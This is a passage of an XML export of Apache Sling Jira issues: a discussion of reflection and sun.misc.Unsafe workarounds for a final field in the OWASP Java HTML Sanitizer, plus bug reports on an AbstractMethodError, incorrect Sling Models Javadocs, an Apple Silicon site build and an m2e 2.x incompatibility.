                                    <fixVersion>XSS Protection API 2.3.8</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>5</watches>
                                                                                                                <comments>
                            <comment id="17612622" author="rombert" created="Tue, 4 Oct 2022 13:48:52 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=tvogel&quot; class=&quot;user-hover&quot; rel=&quot;tvogel&quot;&gt;tvogel&lt;/a&gt; - FYI.&lt;/p&gt;</comment>
                            <comment id="17612967" author="rombert" created="Wed, 5 Oct 2022 12:09:17 +0000"  >&lt;p&gt;The field that we want to make accessible is org.owasp.html.HtmlPolicyBuilder.ATTRIBUTE_GUARDS, and we do that to eliminate the various &apos;mandatory&apos; policies that the Java HTML Sanitizer imposes.&lt;/p&gt;</comment>
                            <comment id="17612981" author="kwin" created="Wed, 5 Oct 2022 12:31:41 +0000"  >&lt;p&gt;Instead of relying on reflection please raise a PR against the Java HTML Sanitizer to make this configurable.&lt;/p&gt;</comment>
                            <comment id="17618943" author="rombert" created="Mon, 17 Oct 2022 14:49:54 +0000"  >&lt;p&gt;Upstream feature request - &lt;a href=&quot;https://github.com/OWASP/java-html-sanitizer/issues/275&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/OWASP/java-html-sanitizer/issues/275&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17624462" author="rombert" created="Wed, 26 Oct 2022 13:18:54 +0000"  >&lt;p&gt;There are a couple of possible ways out of this:&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;upstream library removes the final modifier (preferred, but not activity for now)&lt;/li&gt;
	&lt;li&gt;we make the reflection code invocation compatible with Java 12+ , but that also requires adding &apos;--add-opens ...&apos; everywhere this bundle is used, including the Sling Starter&lt;/li&gt;
	&lt;li&gt;use a Weaving Hook to remove the final modifier for the class&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;I, of course, prefer the first option, but if that will not be viable I would prefer the weaving hook approach, because we won&apos;t have to ask everyone to use &quot;--add-opens&quot;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;Edit&lt;/em&gt;: pushed sample code for &quot;better reflection&quot; at &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-xss/compare/master...issue/SLING-11610-better-reflection&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-xss/compare/master...issue/SLING-11610-better-reflection&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17739072" author="sseifert@pro-vision.de" created="Fri, 30 Jun 2023 13:02:15 +0000"  >&lt;p&gt;does using &lt;tt&gt;sun.misc.Unsafe&lt;/tt&gt; limit us to certain (oracle-published) JDK flavors, or is it widely available?&lt;br/&gt;
fingers crossed that this hack will not lead to more problems in the future.&lt;/p&gt;</comment>
                            <comment id="17739081" author="rombert" created="Fri, 30 Jun 2023 13:22:48 +0000"  >&lt;p&gt;Our Jenkins builds use Adoptium OpenJDK, so I don&apos;t think &lt;tt&gt;sun.misc.Unsafe&lt;/tt&gt; is only available on Oracle-flavoured JDKs. Additionally, it is part of the &quot;official&quot; jdk.unsupported module - best reference I could find is &lt;a href=&quot;https://bugs.openjdk.org/browse/JDK-8153737&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://bugs.openjdk.org/browse/JDK-8153737&lt;/a&gt; . &lt;/p&gt;

&lt;p&gt;Verified also locally&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;$ java --version
openjdk 17.0.7 2023-04-18
OpenJDK Runtime Environment (build 17.0.7+0-suse-3.2-x8664)
OpenJDK 64-Bit Server VM (build 17.0.7+0-suse-3.2-x8664, mixed mode, sharing)
$ java --list-modules | grep unsupported
jdk.unsupported@17.0.7
jdk.unsupported.desktop@17.0.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(this is OpenJDK as packaged by openSUSE ).&lt;/p&gt;</comment>
                            <comment id="17739086" author="sseifert@pro-vision.de" created="Fri, 30 Jun 2023 13:27:22 +0000"  >&lt;p&gt;ok, thanks for checking&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 16 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z191x4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11597] AbstractMethodError with Sling Engine 2.12.0</title>
                <link>https://issues.apache.org/jira/browse/SLING-11597</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;26.09.2022 08:14:55.762 &lt;b&gt;ERROR&lt;/b&gt; &lt;span class=&quot;error&quot;&gt;&amp;#91;qtp736626945-45&amp;#93;&lt;/span&gt; org.apache.sling.engine.impl.SlingRequestProcessorImpl service: Uncaught Throwable&lt;br/&gt;
java.lang.AbstractMethodError: Receiver class org.apache.sling.junit.scriptable.HttpRequest does not define or inherit an implementation of the resolved method &apos;abstract javax.servlet.ServletContext getServletContext()&apos; of interface javax.servlet.ServletRequest.&lt;br/&gt;
        at javax.servlet.ServletRequestWrapper.getServletContext(ServletRequestWrapper.java:370) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.felix.http.servlet-api:1.1.4&amp;#93;&lt;/span&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13483120">SLING-11597</key>
            <summary>AbstractMethodError with Sling Engine 2.12.0</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Mon, 26 Sep 2022 06:38:21 +0000</created>
                <updated>Fri, 30 Sep 2022 00:04:00 +0000</updated>
                            <resolved>Mon, 26 Sep 2022 07:27:39 +0000</resolved>
                                    <version>JUnit Scriptable Tests Provider 1.0.12</version>
                                    <fixVersion>JUnit Scriptable Tests Provider 1.0.14</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17609326" author="cziegeler" created="Mon, 26 Sep 2022 06:51:19 +0000"  >&lt;p&gt;Starting with Engine 2.12.0 ServletRequest.getServletContext is used in some places - this method has been added in servlet 3.0 which is since a long time a prerequisite for Sling.&lt;br/&gt;
However, Sling&apos;s junit scriptable is not implementing these methods. (It also does not use request/response wrapper but implements those interfaces by hand, which is causing for trouble)&lt;/p&gt;</comment>
                            <comment id="17609346" author="cziegeler" created="Mon, 26 Sep 2022 07:27:39 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-junit-scriptable/commit/1ed87bd55865e2f7de4f9285bb7814593d5fcfcd&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-junit-scriptable/commit/1ed87bd55865e2f7de4f9285bb7814593d5fcfcd&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 4 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18ttk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11595] Incorrect injectionStrategy Javadocs</title>
                <link>https://issues.apache.org/jira/browse/SLING-11595</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;It seems that all docs for &lt;tt&gt;injectionStrategy&lt;/tt&gt; in injector annotations are incorrect.&lt;/p&gt;

&lt;p&gt;The current docs:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
/**
&#160;* &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; set to REQUIRED injection is mandatory, &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; set to OPTIONAL injection is optional, in &lt;span class=&quot;code-keyword&quot;&gt;case&lt;/span&gt; of DEFAULT&#160;
&#160;* the standard annotations ({@link org.apache.sling.models.annotations.Optional}, {@link org.apache.sling.models.annotations.Required}) are used.
&#160;* If even those are not available the &lt;span class=&quot;code-keyword&quot;&gt;default&lt;/span&gt; injection strategy defined on the {@link org.apache.sling.models.annotations.Model} applies.
&#160;* Default value = DEFAULT.
&#160;*/ &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;state that &lt;tt&gt;@Optional&lt;/tt&gt; and &lt;tt&gt;@Required&lt;/tt&gt; are used only if &lt;tt&gt;injectionStrategy = DEFAULT&lt;/tt&gt;. &lt;b&gt;It is not true, as these annotations take precedence over &lt;tt&gt;injectionStrategy&lt;/tt&gt;.&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;It is confirmed by implementation of &lt;tt&gt;org.apache.sling.models.impl.model.AbstractInjectableElement&lt;/tt&gt;, but also by test:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/blob/master/src/test/java/org/apache/sling/models/impl/AnnotationConflictsTest.java#L220:L240&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/blob/master/src/test/java/org/apache/sling/models/impl/AnnotationConflictsTest.java#L220:L240&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;I added a new test case:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/pull/38&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/pull/38&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;PR created:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-api/pull/7&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-api/pull/7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <environment></environment>
        <key id="13483083">SLING-11595</key>
            <summary>Incorrect injectionStrategy Javadocs</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="karol.lewandowski">Karol Lewandowski</reporter>
                        <labels>
                    </labels>
                <created>Sun, 25 Sep 2022 18:14:21 +0000</created>
                <updated>Fri, 31 Mar 2023 18:30:05 +0000</updated>
                            <resolved>Tue, 28 Mar 2023 09:37:44 +0000</resolved>
                                    <version>Models API 1.4.2</version>
                                    <fixVersion>Models API 1.5.0</fixVersion>
                    <fixVersion>Models Implementation 1.6.0</fixVersion>
                                    <component>Sling Models</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                <comments>
                            <comment id="17705912" author="sseifert@pro-vision.de" created="Tue, 28 Mar 2023 09:37:37 +0000"  >&lt;p&gt;thanks for the contribution!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-api/commit/ee6260f7f7ae56842ae06ae40296d73061cdf15c&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-api/commit/ee6260f7f7ae56842ae06ae40296d73061cdf15c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/commit/2d0f287885285b9317766b2af28e9c5e0a0e4d91&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/commit/2d0f287885285b9317766b2af28e9c5e0a0e4d91&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 30 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18tlc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11594] Site cannot be built with Apple Silicon</title>
                <link>https://issues.apache.org/jira/browse/SLING-11594</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Due to &lt;a href=&quot;https://github.com/jbake-org/jbake/issues/709&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/jbake-org/jbake/issues/709&lt;/a&gt; the Sling Site cannot be built with Apple Silicon.&lt;br/&gt;
The new version 2.7.0-rc6 adds support, so upgrading should fix this issue.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13483029">SLING-11594</key>
            <summary>Site cannot be built with Apple Silicon</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Sat, 24 Sep 2022 08:57:45 +0000</created>
                <updated>Fri, 4 Nov 2022 16:35:22 +0000</updated>
                            <resolved>Fri, 4 Nov 2022 16:35:22 +0000</resolved>
                                                                    <component>Site</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17629087" author="kwin" created="Fri, 4 Nov 2022 16:35:22 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-site/commit/1cb73124211a08c6840ee57f8e40ab3b18d6abb3&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-site/commit/1cb73124211a08c6840ee57f8e40ab3b18d6abb3&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 50 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18t9c:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11590] AbstractBundleProjectConfigurator no longer compatible with m2e 2.x</title>
                <link>https://issues.apache.org/jira/browse/SLING-11590</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The following stacktrace can be observed when trying to update a Maven configuration of a bundle project with m2e 2.x&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
java.lang.NoSuchMethodError: &lt;span class=&quot;code-quote&quot;&gt;&apos;org.eclipse.core.resources.IProject org.eclipse.m2e.core.project.configurator.ProjectConfigurationRequest.getProject()&apos;&lt;/span&gt;
	at org.apache.sling.ide.eclipse.m2e.internal.AbstractBundleProjectConfigurator.configure(AbstractBundleProjectConfigurator.java:48)
	at org.eclipse.m2e.core.project.configurator.AbstractLifecycleMapping.configure(AbstractLifecycleMapping.java:125)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.lambda$6(ProjectConfigurationManager.java:475)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:350)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:262)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.updateProjectConfiguration(ProjectConfigurationManager.java:469)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.lambda$4(ProjectConfigurationManager.java:413)
	at java.base/java.util.Collection.removeIf(Collection.java:576)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.updateProjectConfiguration0(ProjectConfigurationManager.java:407)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.lambda$3(ProjectConfigurationManager.java:339)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:350)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:262)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:205)
	at org.eclipse.m2e.core.internal.embedder.MavenImpl.execute(MavenImpl.java:1093)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.updateProjectConfiguration(ProjectConfigurationManager.java:338)
	at org.eclipse.m2e.core.ui.internal.UpdateMavenProjectJob.runInWorkspace(UpdateMavenProjectJob.java:80)
	at org.eclipse.core.internal.resources.InternalWorkspaceJob.run(InternalWorkspaceJob.java:43)
	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;due to this change.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13482400">SLING-11590</key>
            <summary>AbstractBundleProjectConfigurator no longer compatible with m2e 2.x</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Tue, 20 Sep 2022 13:41:49 +0000</created>
                <updated>Thu, 25 Sep 2025 10:24:33 +0000</updated>
                            <resolved>Mon, 31 Oct 2022 14:51:35 +0000</resolved>
                                    <version>Sling Eclipse IDE 1.2.2</version>
                                    <fixVersion>Sling Eclipse IDE 1.3.0</fixVersion>
                                    <component>IDE</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="4200">1h 10m</timespent>
                                <comments>
